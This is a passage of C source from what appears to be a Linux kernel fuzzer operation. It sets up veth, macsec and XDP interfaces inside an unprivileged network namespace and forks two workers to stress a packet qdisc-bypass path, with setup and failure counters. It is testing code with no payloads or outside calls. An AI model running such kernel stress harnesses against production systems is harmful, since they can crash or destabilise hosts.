		__atomic_add_fetch(
			&shm->stats.packet_qdisc_bypass_unanchored_l2.setup_failed,
			1, __ATOMIC_RELAXED);
		goto out_nl;
	}

	/* Create macsec device mst0 over veth0 */
	rc = bypass_create_macsec(&nl, "mst0", (int)veth0_ifx);
	if (rc != 0) {
		/* EOPNOTSUPP → CONFIG_MACSEC not loaded; latch the op. */
		__atomic_add_fetch(
			&shm->stats.packet_qdisc_bypass_unanchored_l2.setup_failed,
			1, __ATOMIC_RELAXED);
		if (rc == -EOPNOTSUPP || rc == -ENODEV) {
			ctx->latch_errno = EOPNOTSUPP;
			goto out_nl;
		}
		goto out_nl;
	}

	mst_ifx = if_nametoindex("mst0");
	if (mst_ifx == 0) {
		__atomic_add_fetch(
			&shm->stats.packet_qdisc_bypass_unanchored_l2.setup_failed,
			1, __ATOMIC_RELAXED);
		goto out_nl;
	}

	/* Bring all three interfaces up (best-effort for veth1) */
	(void)bypass_set_link_up(&nl, (int)veth0_ifx);
	(void)bypass_set_link_up(&nl, (int)veth1_ifx);
	(void)bypass_set_link_up(&nl, (int)mst_ifx);

	/* Load an XDP_PASS program and attach to mst0 (best-effort).
	 * XDP_COPY bind() for TX does not strictly require a program. */
	prog_fd = bypass_load_xdp_pass();
	if (prog_fd >= 0) {
		bypass_attach_xdp(&nl, (int)mst_ifx, prog_fd);
	}

	nl_close(&nl);
	nl.fd = -1;

	if (valid_op)
		__atomic_add_fetch(&shm->stats.childop.setup_accepted[op_type],
				   1, __ATOMIC_RELAXED);

	/* Fork Lane A worker */
	pa = fork();
	ctx->direct_calls++;
	if (pa < 0) {
		__atomic_add_fetch(
			&shm->stats.packet_qdisc_bypass_unanchored_l2.setup_failed,
			1, __ATOMIC_RELAXED);
		goto out_prog;
	}
	if (pa == 0)
		lane_a_worker(mst_ifx, "mst0", op_type);

	/* Fork Lane B worker */
	pb = fork();
	ctx->direct_calls++;
	if (pb < 0) {
		(void)kill(pa, SIGKILL);
		ctx->direct_calls++;
		(void)waitpid_eintr(pa, NULL, 0);
		ctx->direct_calls++;
		__atomic_add_fetch(
			&shm->stats.packet_qdisc_bypass_unanchored_l2.setup_failed,
			1, __ATOMIC_RELAXED);
		goto out_prog;
	}
	if (pb == 0)
		lane_b_worker(mst_ifx, op_type);

	if (valid_op)
		__atomic_add_fetch(&shm->stats.childop.data_path[op_type],
				   1, __ATOMIC_RELAXED);

	/* Build parent deadline and reap both workers under it */
	if (clock_gettime(CLOCK_MONOTONIC, &deadline) != 0) {
		deadline.tv_sec  = 0;
		deadline.tv_nsec = 0;
	}
	deadline.tv_nsec += (long)BYPASS_PARENT_WALL_NS;
	while (deadline.tv_nsec >= 1000000000L) {
		deadline.tv_nsec -= 1000000000L;
		deadline.tv_sec  += 1;
	}

	bypass_reap(pa, &deadline, &ctx->direct_calls);
	{
		int wstatus = 0;
		pid_t r;

		/* Poll Lane B first; if it already exited, check for the
		 * EOPNOTSUPP sentinel exit code (42) from xsk_bypass_setup. */
		r = waitpid_eintr(pb, &wstatus, WNOHANG);
		ctx->direct_calls++;
		if (r == pb) {
			if (WIFEXITED(wstatus) && WEXITSTATUS(wstatus) == 42)
				ctx->latch_errno = EOPNOTSUPP;
		} else {
			/* Not done yet; reap under the existing deadline. */
			bypass_reap(pb, &deadline, &ctx->direct_calls);
		}
	}

	__atomic_add_fetch(
		&shm->stats.packet_qdisc_bypass_unanchored_l2.completed_ok,
		1, __ATOMIC_RELAXED);

	if (valid_op)
		childop_direct_syscalls_add(op_type, ctx->direct_calls);

out_prog:
	if (prog_fd >= 0)
		close(prog_fd);
	return 0;

out_nl:
	nl_close(&nl);
	if (prog_fd >= 0)
		close(prog_fd);
	return 0;
}

/* ------------------------------------------------------------------ */
/* CHILDOP entry point                                                   */
/* ------------------------------------------------------------------ */

bool packet_qdisc_bypass_unanchored_l2(struct childdata *child)
{
	struct bypass_ns_ctx ctx = {
		.op_type      = child->op_type,
		.direct_calls = 0,
		.latch_errno  = 0,
	};
	unsigned int outer, i;

	__atomic_add_fetch(
		&shm->stats.packet_qdisc_bypass_unanchored_l2.runs,
		1, __ATOMIC_RELAXED);

	if (ns_unsupported_bypass_l2) {
		__atomic_add_fetch(
			&shm->stats.packet_qdisc_bypass_unanchored_l2.setup_failed,
			1, __ATOMIC_RELAXED);
		return true;
	}

	outer = BUDGETED(CHILD_OP_PACKET_QDISC_BYPASS_L2,
			 JITTER_RANGE(BYPASS_OUTER_BASE));
	if (outer > BYPASS_OUTER_CAP)
		outer = BYPASS_OUTER_CAP;
	if (outer == 0U)
		outer = 1U;

	for (i = 0; i < outer; i++) {
		int rc;

		ctx.latch_errno = 0;
		rc = userns_run_in_ns(CLONE_NEWNET, iter_one_in_ns, &ctx);

		if (rc == -EPERM) {
			ns_unsupported_bypass_l2 = true;
			{
				const int op = child->op_type;
				if (op >= 0 && op < NR_CHILD_OP_TYPES)
					__atomic_store_n(
						&shm->stats.childop.latch_reason[op],
						CHILDOP_LATCH_NS_UNSUPPORTED,
						__ATOMIC_RELAXED);
			}
			__atomic_add_fetch(
				&shm->stats.packet_qdisc_bypass_unanchored_l2.setup_failed,
				1, __ATOMIC_RELAXED);
			return true;
		}

		if (ctx.latch_errno == EOPNOTSUPP) {
			/* CONFIG_MACSEC=m not loaded or AF_XDP unavailable. */
			ns_unsupported_bypass_l2 = true;
			{
				const int op = child->op_type;
				if (op >= 0 && op < NR_CHILD_OP_TYPES)
					__atomic_store_n(
						&shm->stats.childop.latch_reason[op],
						CHILDOP_LATCH_NS_UNSUPPORTED,
						__ATOMIC_RELAXED);
			}
			return true;
		}

		if (rc < 0) {
			__atomic_add_fetch(
				&shm->stats.packet_qdisc_bypass_unanchored_l2.setup_failed,
				1, __ATOMIC_RELAXED);
		}
	}

	return true;
}

#else  /* missing required headers */

#include <stdbool.h>
#include "child.h"
#include "shm.h"

bool packet_qdisc_bypass_unanchored_l2(struct childdata *child)
{
	(void)child;
	__atomic_add_fetch(
		&shm->stats.packet_qdisc_bypass_unanchored_l2.runs,
		1, __ATOMIC_RELAXED);
	__atomic_add_fetch(
		&shm->stats.packet_qdisc_bypass_unanchored_l2.setup_failed,
		1, __ATOMIC_RELAXED);
	return true;
}

#endif /* __has_include guards */
